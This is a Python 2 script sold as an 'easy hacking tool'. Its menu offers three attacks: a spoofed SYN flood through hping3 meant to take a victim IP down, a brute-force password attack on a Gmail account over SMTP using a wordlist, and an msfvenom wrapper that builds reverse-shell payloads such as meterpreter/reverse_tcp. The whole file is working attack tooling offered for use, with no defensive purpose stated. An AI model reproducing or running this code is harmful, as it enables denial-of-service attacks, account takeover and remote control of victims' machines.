#!/usr/bin/python
# -*- coding: utf-8 -*-
import string
import time, os, sys, logging, math
from time import sleep
import urllib2 as urllib
import traceback
import socket
import smtplib

print ("")
print ("")
print ("")
print ("")
print ("")
print ("")
print ("  ")                                                             
print '\033[94m'" __                    _____ _           _     _____         _ "
print '\033[93m'"|  |   ___ ___ _ _ ___| __  | |___ ___ _| |___|_   _|___ ___| |"
print '\033[94m'"|  |__| .'|- _| | |___| __ -| | . | . | . |___| | | | . | . | |"
print '\033[93m'"|_____|__,|___|_  |   |_____|_|___|___|___|     |_| |___|___|_|"
print '\033[94m'"            |___|                        Created by Blood_ingX  "          
print '\033[1m''\033[93m''\033[4m'"			easy hacking tool"
print ("")
print ("")
print '\033[0m''\033[94m'""

print ("What do you wanna do ?")
print ("----------------------")
print ("1 : spoof (like ddos) ")
print("")
print ("2 : Bruteforce mail account ")
print ("")
print ("3 : create payload with msfvenom (metasploit) ")
print ("")
print ("")
print ("")
print '\033[1m\033[4m\033[91m'""

samm = input ("L-B-T >> ")

if samm == 1:
	print '\033[0m'"..."
	ip = raw_input ("ip > ")
	print ("spoof...")
	print ("started...")
	print ("please wait your victime will be down")
	time.sleep(2)
	os.system("hping3 -S -V --flood --rand-source " +str(ip))
	

if samm == 2:
	smtpserver = smtplib.SMTP("smtp.gmail.com",587)
	smtpserver.ehlo()
	smtpserver.starttls()
	print '\033[0m'"..."
	print(" ---------------------------")
	print("(     B  R  U   T   E      )")
	print("(                          )")
	print(" ---------------------------")	
	print("          only gmail account")
	
	
	print ("Enter the target email address :")
	print ("-------------------")
	user = raw_input("email-cracking> ")
	print ("")
	print ("")
	print ("")
	print ("Enter the password list :")
	print ("-------------------")
	passwfile = raw_input("email-cracking> ")
	passwfile = open(passwfile, "r")

	for password in passwfile:
      		try:
			smtpserver.login(user,password)

			print "[*] Password found! %s" % password
			break;
		except smtplib.SMTPAuthenticationError:
			print "[.] Search... %s" % password

if samm == 3:
	print '\033[0m'"..."
	print ("-------------------------------------------------------------------------------")
	lhost = raw_input ("Enter the LHOST > ")
	print ("")
	print ("ok.")
	print ("")
	lport = raw_input ("Enter the LPORT > ")
	print ("")
	print ("ok.")
	print ("")
	print ("-------------------------------------------------------------------------------")
	pay = raw_input ("Enter the payload please example : windows/meterpreter/reverse_tcp > ")
	print ("")
	print ("ok.")
	print ("")
	arch = raw_input ("Enter the extension examples (exe , bat ...) > ")
	print ("")
	print ("ok.")
	print ("")
	direct = raw_input ("Enter the file directories example : /root/Desktop/Blood.exe > ")
	print ("")
	print ("ok.")
	print ("")
	print ("--------------------------------------------------------------------------------")
	os.system ("msfvenom -p " + pay + " lhost=" + lhost + " lport=" + lport + " -f " + arch + " -o " + direct + "")
	print (" - - - - - - - - - - - - - - - - - - - - ")
	print ("")
	print ("-, -, -, -, -, -, -, -, -, -, -, -, -, -,")
	print ("")
	print (" - - - - - - - - - - - - - - - - - - - - ")
	print ("")
	print ("฿itcoin")

else:
	print '\033[0m'""
	print '\033[94m'"..."
	print ("-----")
	print ("Error")
	print ("-----")
	exit()





